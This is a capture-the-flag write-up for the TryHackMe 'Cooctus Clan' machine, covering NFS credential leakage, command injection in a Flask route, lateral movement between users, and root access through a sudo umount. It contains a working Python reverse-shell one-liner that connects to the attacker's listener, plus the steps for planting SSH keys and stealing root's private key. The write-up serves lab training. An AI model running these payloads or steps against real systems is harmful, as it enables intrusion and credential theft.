# TryHackMe — Cooctus Clan — Writeup

## Recon

Full nmap scan against the box turned up:

- **22** — OpenSSH 7.6p1 (Ubuntu)
- **111** — rpcbind
- **2049** — NFS
- **8080** — HTTP, Werkzeug/0.14.1 (Python 3.6.9), page titled "CCHQ"
- assorted mountd/nlockmgr ports from the NFS stack

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-title: CCHQ
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
42281/tcp open  mountd   1-3 (RPC #100005)
43881/tcp open  nlockmgr 1-4 (RPC #100021)
45873/tcp open  mountd   1-3 (RPC #100005)
58765/tcp open  mountd   1-3 (RPC #100005)
```

NFS export was wide open:

```
└─$ showmount -e 10.49.154.238
Export list for 10.49.154.238:
/var/nfs/general *
```

Mounted it locally and found a `credentials.bak` sitting in the share:

```
└─$ sudo mount -o rw 10.49.154.238:/var/nfs/general /tmp/targetnfsattack

└─$ ls
credentials.bak

└─$ cat credentials.bak        
paradoxial.test
ShibaPretzel79
```

## Web enum

Port 8080 is a Flask app behind Werkzeug. Gobuster against it found `/login`, and `/cat` which redirects to `/login` when unauthenticated.

```
└─$ gobuster dir -u http://10.49.154.238:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
login                (Status: 200) [Size: 556]
cat                  (Status: 302) [Size: 219] [--> http://10.49.154.238:8080/login]
```

Logged into `/login` with the creds pulled from the NFS share and got dropped onto `/cat` — the "Cooctus Attack Troubleshooter (C.A.T)" page, which is just a single payload field submitted to the server.

## Foothold

Set up a listener and sent a Python reverse shell as the payload:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.144.158",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Caught the connection and stabilized it:

```
└─$ nc -nvlp 4445                                
listening on [any] 4445 ...
connect to [192.168.144.158] from (UNKNOWN) [10.49.154.238] 58194
$ /bin/bash -i
```

Landed a shell as `paradox`. Flag:

```
paradox@cchq:~$ cat user.txt
THM{2dccd1ab3e03990aea77359831c85ca2}
```

Dropped my own SSH public key into `paradox`'s `authorized_keys` for a stable shell going forward.

Once in, pulled `app.py` for the CAT app, which confirmed the vuln: the `/cat` route takes `request.form['payload']` straight into `os.system()`, no sanitization at all.

```python
@app.route("/cat", methods=['GET', 'POST'])
def cat():
    global logged_in
    if not logged_in:
        return redirect(url_for("login"))
    error = None
    if request.method == "POST":
        payload = request.form['payload']
        os.system(payload)
        return payload
    return render_template("cat.html", error=error)
```

## szymex

Logging in over SSH started throwing wall broadcasts from `szymex` every minute — "approximate location of an upcoming Dr.Pepper shipment" with coordinates.

```
Broadcast message from szymex@cchq (somewhere) (Fri Oct  2 06:55:01 2026):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Fri Oct  2 06:55:01 2026):     
                                                                               
Coordinates: X: 366, Y: 51, Z: 838
```

`szymex`'s home directory had `note_to_para`, a script called `SniffingCat.py`, and a locked-down `mysupersecretpassword.cat`:

```
paradox@cchq:/home/szymex$ cat note_to_para 
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
```

`SniffingCat.py` reads that password file and checks it against a hardcoded string `"pureelpbxr"` using a custom `encode()` function:

```python
def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc
```

That's just ROT13 (with the wraparound handled manually for chars past `'n'`). Running `pureelpbxr` through ROT13 gives `cherrycoke`.

`su`'d to `szymex` with that password. Flag:

```
szymex@cchq:~$ cat user.txt
THM{c89f9f4ef264e22001f9a9c3d72992ef}
```

Also grabbed the actual password file contents while in as szymex:

```
szymex@cchq:~$ cat mysupersecretpassword.cat 
cherrycoke
```

## tux

`tux`'s home has a note about the "Tuxling Trials" — three challenges hiding three fragments of a key.

```
szymex@cchq:/home/tux$ cat note_to_every_cooctus 
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.
```

**tuxling_1** — `nootcode.c`, a C file entirely obfuscated behind `#define` macros:

```
szymex@cchq:/home/tux/tuxling_1$ cat note
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc
```

Ran it through just the preprocessor to unroll the macros instead of trying to read it by eye:

```
szymex@cchq:/home/tux/tuxling_1$ gcc -E nootcode.c | sed '/^#/d' > decoded.c
```

The decoded output revealed the real functions:

```c
int main ( ) {
    printf ( "What does the penguin say?\n" ) ;
    nuut ( ) ;

    return 0 ;
}

void key ( ) {
    printf ( "f96" "050a" "d61" ) ;
}

void nuut ( ) {
    printf ( "NOOT!\n" ) ;
}
```

First fragment: `f96050ad61`

**tuxling_2** (under `/media`) — a note, `fragment.asc`, and `private.key`:

```
szymex@cchq:/media/tuxling_2$ cat note
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!
```

Imported the key and decrypted the fragment:

```
szymex@cchq:/media/tuxling_2$ gpg --import private.key 
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc 
gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d
```

**tuxling_3** — a note handing over the last fragment directly:

```
szymex@cchq:/home/tux/tuxling_3$ cat note 
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.
```

Combined in order: `f96050ad616eaf62818d637b56db1552` — looked like an MD5 hash. Cracked it to `tuxykitty`.

`su`'d to `tux` with that password. Flag:

```
tux@cchq:~$ cat user.txt 
THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}
```

## varg

`sudo -l` as `tux` showed `tux` can run `/home/varg/CooctOS.py` as `varg`, no password needed:

```
tux@cchq:~$ sudo -l
Matching Defaults entries for tux on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tux may run the following commands on cchq:
    (varg) NOPASSWD: /home/varg/CooctOS.py
```

Couldn't read the script directly (permission denied), but `cooctOS_src` had a `.git` folder sitting around. `git show` on HEAD showed a commit titled "Removed CooctOS login script for now" — the full deleted source came back in the diff:

```
tux@cchq:/home/varg/cooctOS_src/.git$ git show
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

diff --git a/bin/CooctOS.py b/bin/CooctOS.py
deleted file mode 100755
index 4ccfcc1..0000000
--- a/bin/CooctOS.py
+++ /dev/null
...
-uname = input("\ncookie login: ")
-pw = input("Password: ")
-
-for i in range(0,2):
-    if pw != "slowroastpork":
-        pw = input("Password: ")
-    else:
-        if uname == "varg":
-            os.setuid(1002)
-            os.setgid(1002)
-            pty.spawn("/bin/rbash")
-            break
-        else:
-            print("Login Failed")
-            break
```

It's a fake boot/login banner that calls `os.setuid`/`os.setgid` to `varg` and spawns an `rbash` if the entered password matches `slowroastpork`. Ran it via `sudo`, logged in with that password, and got dropped into the restricted shell as `varg`. Flag:

```
varg@cchq:~$ cat user.txt
THM{3a33063a4a8a5805d17aa411a53286e6}
```

## root

`sudo -l` as `varg`:

```
varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
```

`findmnt` showed `/opt/CooctFS` is a bind mount of `/home/varg/cooctOS_src` — which is why root's real data under that path was hidden:

```
varg@cchq:~$ findmnt
...
├─/opt/CooctFS                        /dev/mapper/ubuntu--vg-ubuntu--lv[/home/varg/cooctOS_src] ext4        rw,relatime,data=ordered
```

Unmounted it:

```
varg@cchq:~$ sudo /bin/umount /opt/CooctFS 
```

That pulled the bind mount away and exposed what was actually underneath:

```
varg@cchq:~$ cd /opt/CooctFS
varg@cchq:/opt/CooctFS$ ls
root
varg@cchq:/opt/CooctFS$ cd root
varg@cchq:/opt/CooctFS/root$ ls -al
total 28
drwxr-xr-x 5 root root 4096 Feb 20  2021 .
drwxr-xr-x 3 root root 4096 Feb 20  2021 ..
-rw-r--r-- 1 root root 3106 Feb 20  2021 .bashrc
-rw-r--r-- 1 root root   43 Feb 20  2021 root.txt
drwxr-xr-x 2 root root 4096 Feb 20  2021 .ssh
```

Root's real home directory, `.ssh` included. Grabbed `id_rsa` from there, fixed its permissions, and SSH'd in as root:

```
└─$ ssh -i id_rsa root@10.49.154.238                             

root@cchq:~# ls
root.txt
root@cchq:~# cat root.txt
THM{H4CK3D_BY_C00CTUS_CL4N}
```

